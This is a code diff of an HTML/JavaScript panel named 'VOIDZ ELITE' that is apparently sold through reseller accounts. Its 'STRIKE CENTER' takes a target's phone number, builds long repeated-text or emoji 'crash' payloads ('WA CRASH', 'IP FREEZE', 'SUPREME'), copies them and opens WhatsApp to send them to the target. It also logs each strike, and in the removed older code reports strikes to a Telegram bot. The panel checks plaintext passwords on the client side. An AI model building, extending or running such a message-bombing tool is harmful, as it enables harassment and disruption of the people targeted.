@@ -11,236 +11,245 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; -webkit-tap-highlight-color: transparent; }
         body { background: var(--bg); color: #fff; height: 100vh; width: 100vw; overflow: hidden; position: relative; }
         
-        #ash-canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
+        #ash-canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2; pointer-events: none; }
         .content-layer { position: relative; z-index: 10; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
-        .neon-red { color: var(--neon-red); text-shadow: 0 0 10px var(--neon-red); font-family: 'Orbitron'; font-weight: 900; }
+        .neon-red { color: var(--neon-red); text-shadow: 0 0 10px var(--neon-red), 0 0 20px var(--neon-red); font-family: 'Orbitron'; font-weight: 900; }
         
-        .box { width: 85%; max-width: 330px; background: var(--card); border: 1px solid #222; padding: 25px; border-radius: 20px; text-align: center; border-top: 3px solid var(--fire); position: relative; z-index: 99999; box-shadow: 0 0 20px rgba(255, 69, 0, 0.1); }
-        .input-box { width: 100%; background: #080808; border: 1px solid #333; padding: 12px; color: #fff; margin-bottom: 10px; text-align: center; font-size: 11px; border-radius: 8px; outline: none; transition: 0.3s; }
+        /* LOGIN PAGE */
+        #loginPage { flex: 1; display: flex; justify-content: center; align-items: center; z-index: 100; }
+        .login-box { width: 85%; max-width: 320px; background: var(--card); border: 1px solid #222; padding: 30px; border-radius: 15px; text-align: center; border-top: 3px solid var(--fire); }
+        .profile-img { width: 85px; height: 85px; border-radius: 50%; border: 2px solid var(--fire); box-shadow: 0 0 15px var(--fire); margin-bottom: 20px; object-fit: cover; }
+        
+        .btn-main { width: 100%; background: var(--fire); color: #000; border: none; padding: 14px; font-weight: 900; cursor: pointer; border-radius: 5px; font-family: 'Orbitron'; margin-top: 5px; }
+        .input-box { width: 100%; background: #080808; border: 1px solid #333; padding: 12px; color: #fff; margin-bottom: 10px; text-align: center; font-size: 11px; border-radius: 5px; outline: none; transition: 0.3s; }
         .input-box:focus { border-color: var(--fire); }
-        
-        .btn-main { width: 100%; background: var(--fire); color: #000; border: none; padding: 13px; font-weight: 900; cursor: pointer; border-radius: 8px; font-family: 'Orbitron'; position: relative; z-index: 100001; margin-top: 5px; transition: 0.3s; }
-        .btn-sub { width: 100%; background: transparent; padding: 10px; border-radius: 8px; font-family: 'Orbitron'; font-size: 9px; cursor: pointer; font-weight: bold; position: relative; z-index: 100001; margin-top: 8px; transition: 0.3s; }
 
-        .menu-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; width: 100%; }
-        .menu-item { background: #080808; border: 1px solid #222; padding: 15px 10px; border-radius: 12px; text-align: center; font-size: 9px; cursor: pointer; transition: 0.3s; position: relative; }
-        .menu-item i { display: block; margin-bottom: 8px; font-size: 16px; color: var(--fire); }
-        .menu-item:active { border-color: var(--fire); background: rgba(255,69,0,0.1); }
+        /* DASHBOARD */
+        .header-title { text-align: center; margin-top: 45px; font-size: 18px; letter-spacing: 2px; }
+        .banner-container { width: 100%; aspect-ratio: 16/9; border: 1px solid #333; border-radius: 8px; overflow: hidden; margin: 10px 0 5px; background: #000; }
+        .home-info { background: var(--card); border: 1px solid #222; padding: 15px; border-radius: 12px; border-left: 5px solid var(--fire); margin-bottom: 15px; }
+        .info-row { display: flex; align-items: center; gap: 12px; margin-bottom: 8px; }
+        .info-val { font-size: 14px; font-weight: 900; font-family: 'Orbitron'; }
 
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.96); z-index: 200000; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
-        .modal-content { background: #080808; padding: 25px; border: 1px solid var(--fire); width: 90%; max-width: 350px; border-radius: 15px; max-height: 85vh; overflow-y: auto; }
-        
-        #loginPage, #mainApp { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; width: 100%; }
-        .log-entry { font-size: 8px; border-left: 2px solid var(--fire); padding-left: 8px; margin-bottom: 10px; text-align: left; }
+        /* TAB SYSTEM */
+        .tab-content { display: none; padding: 15px; overflow-y: auto; height: 100%; padding-top: 10px; padding-bottom: 80px; }
+        .active-tab { display: block; }
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #050505; border-top: 1px solid #222; display: none; height: 65px; z-index: 1000; }
+        .nav-btn { display: flex; flex-direction: column; align-items: center; justify-content: center; color: #444; flex: 1; font-size: 8px; cursor: pointer; }
+        .nav-btn.active { color: var(--fire); }
+
+        /* MODAL */
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.97); z-index: 2000; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
+        .modal-content { background: #080808; padding: 25px; border: 1px solid var(--fire); width: 90%; max-width: 400px; border-radius: 12px; max-height: 80vh; overflow-y: auto; }
+
+        /* LOGS AREA */
+        #logContent { background: #050505; border: 1px solid #222; padding: 10px; height: 350px; overflow-y: auto; font-size: 9px; color: #0f0; border-radius: 5px; }
+        .log-entry { margin-bottom: 8px; border-left: 2px solid var(--fire); padding-left: 8px; text-align: left; }
     </style>
 </head>
 <body>
-
     <canvas id="ash-canvas"></canvas>
+    <div id="notif-box" style="position:fixed; top:15px; right:15px; z-index:9999;"></div>
 
     <div class="content-layer">
         <div id="loginPage">
-            <div class="box">
-                <img src="login.jpg" style="width:80px; height:80px; border-radius:50%; border:2px solid var(--fire); margin-bottom:15px; object-fit: cover; box-shadow: 0 0 15px var(--fire);">
-                <h2 class="neon-red">VOIDZ ELITE</h2>
-                <p style="font-size: 8px; color: #444; margin-bottom: 15px;">SUPREME SUPREME V1</p>
+            <div class="login-box">
+                <img src="login.jpg" class="profile-img" onerror="this.src='https://api.dicebear.com/7.x/pixel-art/svg?seed=voidz'">
+                <h2 class="neon-red" style="font-size: 16px; margin-bottom: 10px;">VOIDZ ELITE V1</h2>
                 <input type="text" id="lUser" class="input-box" placeholder="OPERATOR ID">
                 <input type="password" id="lPass" class="input-box" placeholder="ACCESS KEY">
-                <button class="btn-main" id="igniteBtn" onclick="auth()">IGNITE</button>
-                <button onclick="setupAPI()" style="background:none; border:none; color:#111; font-size:8px; margin-top:15px; cursor:pointer;">[ SET API ]</button>
+                <button type="button" onclick="auth()" class="btn-main" id="btnLog">IGNITE</button>
+                <button onclick="setupAPI()" style="background:none; border:none; color:#111; font-size:8px; margin-top:20px; cursor:pointer; width: 100%;">[ SET API ]</button>
             </div>
         </div>
 
-        <div id="mainApp" style="display:none;">
-            <div class="box">
-                <video autoplay muted loop playsinline style="width:75px; height:75px; border-radius:50%; border:2px solid var(--fire); object-fit: cover; margin-bottom:10px;">
-                    <source src="dashboard.mp4" type="video/mp4">
-                </video>
-                <h2 class="neon-red" id="userGreet">...</h2>
-                <div id="roleInfo" style="margin: 8px 0;"></div>
-                <div id="menuContainer" class="menu-grid"></div>
-                <button class="btn-main" style="background:#111; color:#333; margin-top:15px; font-size:9px;" onclick="location.reload()">TERMINATE SESSION</button>
+        <div id="mainApp" style="display:none; flex:1; overflow:hidden;">
+            <div id="tabHOME" class="tab-content active-tab">
+                <div class="header-title neon-red">VOIDZ ELITE</div>
+                <div class="banner-container"><video id="homeVideo" loop muted playsinline style="width:100%; height:100%; object-fit:cover;"><source src="dashboard.mp4" type="video/mp4"></video></div>
+                <marquee style="color:var(--fire); font-size:9px; margin-bottom:10px;">[SYSTEM LIVE] - WELCOME OPERATOR - MONITORING ACTIVE</marquee>
+                
+                <div class="home-info">
+                    <div class="info-row"><i class="fas fa-user" style="color:var(--fire)"></i><span id="uName" class="info-val">...</span></div>
+                    <div class="info-row"><i class="fas fa-crown" style="color:var(--fire)"></i><span id="uRole" class="info-val">...</span></div>
+                    <div class="info-row"><i class="fas fa-bolt" style="color:var(--fire)"></i><span id="uQuota" class="info-val">...</span></div>
+                    <div class="info-row"><i class="fas fa-calendar-alt" style="color:#0f0"></i><span id="uExp" class="info-val" style="color:#0f0;">...</span></div>
+                </div>
+
+                <div id="menuContainer" style="display:grid; grid-template-columns:1fr 1fr; gap:10px;"></div>
+                <button class="btn-main" style="background:#111; color:#333; margin-top:20px; font-size:9px;" onclick="location.reload()">TERMINATE SESSION</button>
+            </div>
+
+            <div id="tabATTACK" class="tab-content">
+                <div class="header-title neon-red" style="margin-top:20px;">STRIKE CENTER</div>
+                <div style="background:var(--card); padding:20px; border-radius:10px; border:1px solid #222; border-top:2px solid var(--fire); margin-top:20px;">
+                    <h3 style="color:var(--fire); font-size:12px; margin-bottom:15px; font-family:'Orbitron'">BUG SELECTOR</h3>
+                    <input type="text" id="targetBug" class="input-box" placeholder="Target 628xxx">
+                    <select id="bugType" class="input-box">
+                        <option value="LITE">WA CRASH (LITE)</option>
+                        <option value="FREEZE">IP FREEZE (MEDIUM)</option>
+                        <option value="SUPREME">SUPREME (HARD)</option>
+                    </select>
+                    <button class="btn-main" onclick="startAttack()">EXECUTE STRIKE</button>
+                </div>
+            </div>
+
+            <div id="tabLOGS" class="tab-content">
+                <div class="header-title neon-red" style="margin-top:20px; margin-bottom:15px;">SYSTEM LOGS</div>
+                <div id="logContent"></div>
+                <button class="btn-main" onclick="clearLogs()" style="margin-top:10px; background:#222; color:#f00; font-size:9px;">CLEAR LOGS</button>
             </div>
         </div>
+
+        <nav id="bottomNav" class="bottom-nav">
+            <div class="nav-btn active" onclick="switchTab('home', this)"><i class="fas fa-home"></i><span>HOME</span></div>
+            <div class="nav-btn" onclick="switchTab('attack', this)"><i class="fas fa-skull"></i><span>ATTACK</span></div>
+            <div id="navLogs" class="nav-btn" onclick="switchTab('logs', this)" style="display:none;"><i class="fas fa-terminal"></i><span>LOGS</span></div>
+        </nav>
     </div>
 
     <div id="modalGen" class="modal">
         <div class="modal-content">
-            <h3 class="neon-red" style="font-size:12px; margin-bottom:15px;">GENERATE UNIT</h3>
-            <input type="text" id="gUser" class="input-box" placeholder="ID BARU">
-            <input type="text" id="gPass" class="input-box" placeholder="KEY BARU">
-            <select id="gRole" class="input-box" onchange="toggleQInput()"><option value="member">MEMBER</option><option value="reseller" id="optReseller">RESELLER</option></select>
-            <select id="gTime" class="input-box"><option value="30">30 HARI</option><option value="lifetime" id="optLife">LIFETIME</option></select>
+            <h3 class="neon-red" style="font-size:12px;">GENERATE UNIT</h3>
+            <input type="text" id="gUser" class="input-box" placeholder="NEW ID" style="margin-top:15px;">
+            <input type="text" id="gPass" class="input-box" placeholder="ACCESS KEY">
+            <select id="gRole" class="input-box" onchange="toggleQInput()">
+                <option value="member">ROLE: MEMBER</option>
+                <option value="reseller" id="resOption">ROLE: RESELLER</option>
+            </select>
+            <select id="gTime" class="input-box">
+                <option value="30">TIME: 1 MONTH</option>
+                <option value="lifetime" id="lifeOption">TIME: LIFETIME</option>
+            </select>
             <div id="qArea" style="display:none;"><input type="number" id="gQuota" class="input-box" placeholder="SET QUOTA"></div>
-            <button class="btn-main" onclick="doGenerate()">PUSH TO CLOUD</button>
-            <button onclick="closeModal()" class="btn-sub" style="border:none; color:#555;">CANCEL</button>
-        </div>
-    </div>
-
-    <div id="modalLogs" class="modal">
-        <div class="modal-content">
-            <h3 class="neon-red" style="font-size:12px; margin-bottom:15px; color:#0f0;">SYSTEM LOGS</h3>
-            <div id="logsArea" style="max-height: 250px; overflow-y: auto; background:#000; padding:10px; border-radius:5px;"></div>
-            <button onclick="clearLogs()" class="btn-sub" style="color:var(--fire); margin-top:10px;">CLEAR LOGS</button>
-            <button onclick="closeModal()" class="btn-main" style="background:#222; color:#fff; margin-top:5px;">CLOSE</button>
+            <button class="btn-main" onclick="doGenerate()">PUSH UNIT</button>
+            <button onclick="closeModal()" style="color:#444; width:100%; border:none; background:none; margin-top:10px; font-size:9px;">CANCEL</button>
         </div>
     </div>
 
     <div id="modalManage" class="modal">
         <div class="modal-content">
-            <h3 class="neon-red" style="font-size:12px; margin-bottom:15px;">MANAGE UNITS</h3>
-            <input type="text" id="searchInp" class="input-box" placeholder="Cari ID Operator..." onkeyup="searchUnit()">
+            <h3 class="neon-red" style="font-size:12px;">MANAGE UNITS</h3>
+            <input type="text" id="searchInp" class="input-box" placeholder="Cari ID..." onkeyup="searchUnit()">
             <div id="unitListArea" style="max-height: 250px; overflow-y: auto;"></div>
             <button onclick="closeModal()" class="btn-main" style="background:#222; color:#fff; margin-top:15px;">BACK</button>
-        </div>
-    </div>
-
-    <div id="modalConfig" class="modal">
-        <div class="modal-content">
-            <h3 class="neon-red" style="font-size:12px; margin-bottom:15px;">OWNER CONFIG</h3>
-            <input type="text" id="cfgToken" class="input-box" placeholder="Bot Token Telegram">
-            <input type="text" id="cfgChat" class="input-box" placeholder="Chat ID Telegram">
-            <input type="text" id="cfgSaluran" class="input-box" placeholder="Link Saluran WA">
-            <button class="btn-main" onclick="saveConfig()">SAVE CONFIG</button>
-            <button onclick="closeModal()" class="btn-sub" style="border:none;">CANCEL</button>
         </div>
     </div>
 
     <script>
         let JB_KEY = localStorage.getItem('JB_KEY'), JB_BIN = localStorage.getItem('JB_BIN'), DB = {}, USER = {};
 
-        // BACKGROUND ANIMATION
+        // --- PARTICLE ENGINE ---
         const canvas = document.getElementById('ash-canvas');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
         let particles = [];
-        class Particle { constructor(){this.x=Math.random()*canvas.width;this.y=Math.random()*canvas.height;this.v=Math.random()*0.4+0.1;this.s=Math.random()*1.5;} draw(){ctx.fillStyle='rgba(150,150,150,0.2)';ctx.beginPath();ctx.arc(this.x,this.y,this.s,0,Math.PI*2);ctx.fill();} update(){this.y-=this.v;if(this.y<0)this.y=canvas.height;} }
-        for(let i=0;i<70;i++)particles.push(new Particle());
-        function anim(){ctx.clearRect(0,0,canvas.width,canvas.height);particles.forEach(p=>{p.draw();p.update();});requestAnimationFrame(anim);}
-        anim();
-
-        // UTILITIES
-        function formatPhone(p){ let f=p.replace(/[^0-9]/g,''); if(f.startsWith('0'))f='62'+f.slice(1); return f; }
-        function setupAPI(){ let k=prompt("Master Key:"), b=prompt("Bin ID:"); if(k&&b){localStorage.setItem('JB_KEY',k.trim()); localStorage.setItem('JB_BIN',b.trim()); location.reload();} }
-        function closeModal(){ document.querySelectorAll('.modal').forEach(m=>m.style.display='none'); }
-        function toggleQInput(){ document.getElementById('qArea').style.display = (document.getElementById('gRole').value==='reseller'?'block':'none'); }
-        async function syncDB(){ await fetch(`https://api.jsonbin.io/v3/b/${JB_BIN}`, { method:'PUT', headers:{'Content-Type':'application/json','X-Master-Key':JB_KEY}, body:JSON.stringify(DB) }); }
-
-        function sendTele(type, data){
-            if(!DB._sys || !DB._sys.token) return;
-            let msg = ""; const l = "━━━━━━━━━━";
-            if(type==='LOGIN') msg = `🔓 <b>LOGIN</b>\n${l}\n👤 ID: <code>${data.u}</code>\n🛡️ Role: ${data.r.toUpperCase()}`;
-            if(type==='GENERATE') msg = `🆕 <b>UNIT</b>\n${l}\n👷 By: ${USER.id}\n🔑 ID: <code>${data.u}</code>\n🎭 Role: ${data.r}`;
-            if(type==='STRIKE') msg = `🚀 <b>STRIKE</b>\n${l}\n👤 By: ${USER.id}\n🎯 Target: ${data.t}\n🔥 Bug: ${data.b}`;
-            fetch(`https://api.telegram.org/bot${DB._sys.token}/sendMessage?chat_id=${DB._sys.chat}&text=${encodeURIComponent(msg)}&parse_mode=html`);
+        for(let i=0; i<60; i++) particles.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, s: Math.random()*1.5+0.5, d: Math.random()*0.5+0.2 });
+        function drawP() {
+            ctx.clearRect(0,0,canvas.width,canvas.height); ctx.fillStyle = "rgba(200,200,200,0.3)";
+            particles.forEach(p => { ctx.beginPath(); ctx.arc(p.x, p.y, p.s, 0, Math.PI*2); ctx.fill(); p.y -= p.d; if(p.y < 0) p.y = canvas.height; });
+            requestAnimationFrame(drawP);
         }
+        drawP();
 
-        async function addLog(action, user){
+        // --- SYSTEM ---
+        function notify(m) { const b = document.getElementById('notif-box'); const t = document.createElement('div'); t.style="background:#111; border-left:3px solid var(--fire); color:#fff; padding:10px; margin-bottom:5px; font-size:10px; width:200px;"; t.innerText = m; b.appendChild(t); setTimeout(() => t.remove(), 2500); }
+        function setupAPI() { let k=prompt("Master Key:"), b=prompt("Bin ID:"); if(k&&b){localStorage.setItem('JB_KEY',k.trim()); localStorage.setItem('JB_BIN',b.trim()); location.reload();} }
+        function closeModal() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }
+        function toggleQInput() { document.getElementById('qArea').style.display = (document.getElementById('gRole').value === 'reseller' ? 'block' : 'none'); }
+        async function syncDB() { await fetch(`https://api.jsonbin.io/v3/b/${JB_BIN}`, { method:'PUT', headers:{'Content-Type':'application/json','X-Master-Key':JB_KEY}, body:JSON.stringify(DB) }); }
+
+        async function addLog(action, user) {
             if(!DB._logs) DB._logs = [];
             DB._logs.push({ time: new Date().toLocaleTimeString(), action, user });
             if(DB._logs.length > 50) DB._logs.shift();
             await syncDB();
         }
 
-        // CORE LOGIC
-        async function auth(){
-            if(!JB_KEY) return alert("Setup API Dulu!");
-            const u=document.getElementById('lUser').value.trim(), p=document.getElementById('lPass').value.trim();
-            const btn=document.getElementById('igniteBtn'); btn.innerText="SYNCING...";
+        async function auth() {
+            if(!JB_KEY || !JB_BIN) return alert("PENCET [ SET API ] DULU!");
+            const u = document.getElementById('lUser').value.trim(), p = document.getElementById('lPass').value.trim();
             try {
-                const res = await fetch(`https://api.jsonbin.io/v3/b/${JB_BIN}/latest`, { headers:{'X-Master-Key':JB_KEY,'X-Bin-Meta':false} });
+                const res = await fetch(`https://api.jsonbin.io/v3/b/${JB_BIN}/latest`, { headers: { 'X-Master-Key': JB_KEY, 'X-Bin-Meta': false } });
                 DB = await res.json();
-                if(DB[u] && DB[u].pw === p){
-                    USER = {id:u, ...DB[u]};
-                    addLog("LOGIN_SUCCESS", u); sendTele('LOGIN', {u:u, r:DB[u].role});
-                    document.getElementById('loginPage').style.display='none';
-                    document.getElementById('mainApp').style.display='flex';
-                    renderDashboard();
-                } else { alert("ACCESS DENIED!"); btn.innerText="IGNITE"; }
-            } catch(e) { alert("DATABASE ERROR!"); btn.innerText="IGNITE"; }
+                if(DB[u] && DB[u].pw === p) {
+                    USER = { id: u, ...DB[u] };
+                    document.getElementById('loginPage').style.display = 'none';
+                    document.getElementById('mainApp').style.display = 'block';
+                    document.getElementById('bottomNav').style.display = 'flex';
+                    if(USER.role === 'owner') document.getElementById('navLogs').style.display = 'flex';
+                    renderHome(); addLog("LOGIN SUCCESS", u);
+                    document.getElementById('homeVideo').play();
+                } else { alert("ACCESS DENIED!"); }
+            } catch(e) { alert("DATABASE ERROR!"); }
         }
 
-        function renderDashboard(){
-            document.getElementById('userGreet').innerText = USER.id;
-            let exp = (USER.exp==='lifetime'||USER.role==='owner') ? "∞" : new Date(USER.exp).toLocaleDateString('id-ID');
-            let stock = (USER.role==='reseller') ? `<div style="font-size:10px; color:var(--fire)">STOCK: ${USER.quota} UNIT</div>` : "";
-            document.getElementById('roleInfo').innerHTML = `<span style="color:var(--fire)">${USER.role.toUpperCase()}</span> | <span style="color:#555">EXP: ${exp}</span>${stock}`;
+        function renderHome() {
+            document.getElementById('uName').innerText = USER.id;
+            document.getElementById('uRole').innerText = USER.role.toUpperCase();
+            document.getElementById('uQuota').innerText = (USER.role === 'owner' || USER.exp === 'lifetime') ? '∞' : USER.quota;
+            document.getElementById('uExp').innerText = (USER.role === 'owner' || USER.exp === 'lifetime') ? 'PERMANEN' : new Date(USER.exp).toLocaleDateString();
             
             const m = document.getElementById('menuContainer'); m.innerHTML = "";
-            m.innerHTML += `<div class="menu-item" onclick="startStrike()" style="grid-column:span 2; border-color:#f00; background:rgba(255,0,0,0.05);"><i class="fas fa-biohazard"></i> EXECUTE STRIKE</div>`;
-            
-            if(USER.role==='owner' || (USER.role==='reseller' && USER.quota > 0)) m.innerHTML += `<div class="menu-item" onclick="openGen()"><i class="fas fa-plus-circle"></i> GENERATE</div>`;
-            
-            m.innerHTML += `<div class="menu-item" onclick="window.open('https://wa.me/6285718241306')"><i class="fas fa-headset"></i> ADMIN</div>`;
-
-            if(USER.role==='owner'){
-                m.innerHTML += `<div class="menu-item" onclick="openManage()"><i class="fas fa-search"></i> MANAGE</div>`;
-                m.innerHTML += `<div class="menu-item" onclick="openLogs()"><i class="fas fa-terminal"></i> LOGS</div>`;
-                m.innerHTML += `<div class="menu-item" onclick="openConfig()" style="grid-column:span 2; border-color:#0f0;"><i class="fas fa-cog"></i> OWNER CONFIG</div>`;
-            }
-            
-            m.innerHTML += `<div class="menu-item" onclick="openSaluran()"><i class="fas fa-bullhorn"></i> CHANNEL</div>`;
-            m.innerHTML += `<div class="menu-item" onclick="location.reload()"><i class="fas fa-bug"></i> REPORT BUG</div>`;
+            if(USER.role !== 'member') m.innerHTML += `<div onclick="openGen()" style="background:var(--card); padding:15px; text-align:center; border:1px solid var(--fire); border-radius:10px;"><i class="fas fa-plus" style="color:var(--fire)"></i><br><span style="font-size:9px;">GENERATE</span></div>`;
+            if(USER.role === 'owner') m.innerHTML += `<div onclick="openManage()" style="background:var(--card); padding:15px; text-align:center; border:1px solid #00e5ff; border-radius:10px;"><i class="fas fa-users-cog" style="color:#00e5ff"></i><br><span style="font-size:9px;">MANAGE</span></div>`;
+            m.innerHTML += `<div onclick="window.open('https://wa.me/6285718241306')" style="background:var(--card); padding:15px; text-align:center; border:1px solid #25d366; border-radius:10px;"><i class="fab fa-whatsapp" style="color:#25d366"></i><br><span style="font-size:9px;">ADMIN</span></div>`;
+            m.innerHTML += `<div onclick="location.reload()" style="background:var(--card); padding:15px; text-align:center; border:1px solid #444; border-radius:10px;"><i class="fas fa-power-off" style="color:#444"></i><br><span style="font-size:9px;">EXIT</span></div>`;
         }
 
-        function startStrike(){
-            let t = prompt("NOMOR TARGET (08xxx):"); if(!t) return;
-            let tc = formatPhone(t);
-            let b = prompt("TYPE BUG:\n1. BASIC VIRTEX\n2. WEB CRASH\n3. UI FREEZE\n(Ketik Angka)");
-            let bug = (b==="3") ? "❄️".repeat(1000) : "🔥".repeat(500);
-            let bName = b==="1"?"BASIC":b==="2"?"CRASH":"FREEZE";
-            window.open(`https://wa.me/${tc}?text=${encodeURIComponent("VOIDZ ELITE ATTACK:\n"+bug)}`, '_blank');
-            addLog(`STRIKE_TARGET_${tc}_${bName}`, USER.id); sendTele('STRIKE', {t:tc, b:bName});
+        function switchTab(t, el) { 
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active-tab')); 
+            document.getElementById('tab'+t.toUpperCase()).classList.add('active-tab'); 
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active')); 
+            el.classList.add('active'); 
+            if(t === 'logs') renderLogs();
         }
 
-        function openGen(){
-            document.getElementById('optReseller').style.display = (USER.role==='owner'?'block':'none');
-            document.getElementById('optLife').style.display = (USER.exp==='lifetime'||USER.role==='owner'?'block':'none');
-            document.getElementById('modalGen').style.display='flex';
+        function startAttack() {
+            const t = document.getElementById('targetBug').value.trim();
+            if(!t) return alert("TARGET KOSONG!");
+            let tc = t.replace(/\D/g, ''); if(tc.startsWith('0')) tc = '62' + tc.slice(1);
+            const type = document.getElementById('bugType').value;
+            let p = (type==='LITE') ? "LITE ".repeat(100) : (type==='FREEZE') ? "FREEZE ".repeat(500) : "SUPREME ".repeat(1000);
+            navigator.clipboard.writeText(p);
+            notify("PAYLOAD COPIED!");
+            window.open(`https://wa.me/${tc}?text=${encodeURIComponent("VOIDZ ATTACK:\n" + p.substring(0,50))}`, '_blank');
+            addLog(`STRIKE_TO_${tc}`, USER.id);
         }
 
-        async function doGenerate(){
+        function openGen() {
+            document.getElementById('modalGen').style.display = 'flex';
+            document.getElementById('resOption').style.display = (USER.role === 'owner' ? 'block' : 'none');
+            document.getElementById('lifeOption').style.display = (USER.role === 'owner' ? 'block' : 'none');
+        }
+
+        async function doGenerate() {
             const u=document.getElementById('gUser').value.trim(), p=document.getElementById('gPass').value.trim(), r=document.getElementById('gRole').value, t=document.getElementById('gTime').value;
-            if(!u||!p) return alert("Lengkapi Data!");
-            if(USER.role==='reseller'){ if(USER.quota<=0)return alert("Quota Habis!"); DB[USER.id].quota-=1; }
-            let ex = (t==='lifetime') ? 'lifetime' : new Date().getTime()+(30*86400000);
+            if(!u || !p) return alert("DATA TIDAK LENGKAP!");
+            if(USER.role==='reseller'){ if(USER.quota<=0)return alert("QUOTA HABIS!"); DB[USER.id].quota-=1; }
+            let ex = (t === 'lifetime') ? 'lifetime' : new Date().getTime() + (30*86400000);
             DB[u] = { pw:p, role:r, exp:ex, quota:parseInt(document.getElementById('gQuota').value)||0 };
-            await syncDB();
-            navigator.clipboard.writeText(`ID: ${u}\nKEY: ${p}\nEXP: ${t}`);
-            addLog(`GENERATE_${u}_${r}`, USER.id); sendTele('GENERATE', {u:u, r:r});
-            alert("UNIT CREATED & COPIED!"); location.reload();
+            await syncDB(); alert("UNIT CREATED!"); location.reload();
         }
 
-        function openLogs(){
-            const area = document.getElementById('logsArea');
-            area.innerHTML = (DB._logs||[]).reverse().map(l=>`<div class="log-entry"><b style="color:#0f0">[${l.time}]</b> ${l.action}<br>👤 By: ${l.user}</div>`).join('');
-            document.getElementById('modalLogs').style.display='flex';
-        }
-        async function clearLogs(){ if(confirm("Clear?")){ DB._logs=[]; await syncDB(); openLogs(); } }
-
-        function openManage(){ renderUnits(); document.getElementById('modalManage').style.display='flex'; }
-        function renderUnits(){
+        function openManage() { renderUnits(); document.getElementById('modalManage').style.display = 'flex'; }
+        function renderUnits() {
             const area = document.getElementById('unitListArea'); area.innerHTML = "";
-            Object.keys(DB).filter(k=>!k.startsWith('_')).forEach(id=>{
-                const isO = DB[id].role==='owner';
-                area.innerHTML += `<div class="unit-card" style="display:flex; justify-content:space-between; padding:10px; border-bottom:1px solid #111; font-size:10px;">
-                    <span>${id} [${DB[id].role}]</span>
-                    ${!isO ? `<i class="fas fa-trash" style="color:#f00" onclick="delUnit('${id}')"></i>` : '<i class="fas fa-shield-alt" style="color:#0f0"></i>'}
+            Object.keys(DB).filter(k=>!k.startsWith('_')).forEach(id => {
+                area.innerHTML += `<div style="display:flex; justify-content:space-between; padding:10px; border-bottom:1px solid #111; font-size:10px;">
+                    <span>${id} [${DB[id].role.toUpperCase()}]</span>
+                    ${DB[id].role!=='owner' ? `<i class="fas fa-trash" style="color:#f00" onclick="delUnit('${id}')"></i>` : '<i class="fas fa-shield-alt" style="color:#0f0"></i>'}
                 </div>`;
             });
         }
-        async function delUnit(id){ if(confirm(`Hapus ${id}?`)){ delete DB[id]; await syncDB(); addLog(`DELETE_${id}`, USER.id); renderUnits(); } }
-        function searchUnit(){ let q=document.getElementById('searchInp').value.toLowerCase(); document.querySelectorAll('.unit-card').forEach(d=>{ d.style.display=d.innerText.toLowerCase().includes(q)?'flex':'none'; }); }
+        async function delUnit(id) { if(confirm(`Hapus ${id}?`)) { delete DB[id]; await syncDB(); renderUnits(); } }
+        function searchUnit() { let q = document.getElementById('searchInp').value.toLowerCase(); }
 
-        function openConfig(){
-            if(DB._sys){ document.getElementById('cfgToken').value=DB._sys.token||""; document.getElementById('cfgChat').value=DB._sys.chat||""; document.getElementById('cfgSaluran').value=DB._sys.saluran||""; }
-            document.getElementById('modalConfig').style.display='flex';
+        function renderLogs() {
+            const area = document.getElementById('logContent');
+            area.innerHTML = (DB._logs || []).reverse().map(l => `<div class="log-entry"><b>[${l.time}]</b> ${l.action}<br>👤 By: ${l.user}</div>`).join('');
         }
-        async function saveConfig(){
-            DB._sys = { token:document.getElementById('cfgToken').value, chat:document.getElementById('cfgChat').value, saluran:document.getElementById('cfgSaluran').value };
-            await syncDB(); alert("CONFIG SAVED!"); closeModal();
-        }
-        function openSaluran(){ window.open(DB._sys?.saluran || "https://whatsapp.com/channel/0029Vajr9p93LdQZ4Yn0Ww3d", '_blank'); }
+        async function clearLogs() { if(confirm("Clear?")) { DB._logs = []; await syncDB(); renderLogs(); } }
     </script>
 </body>
 </html>
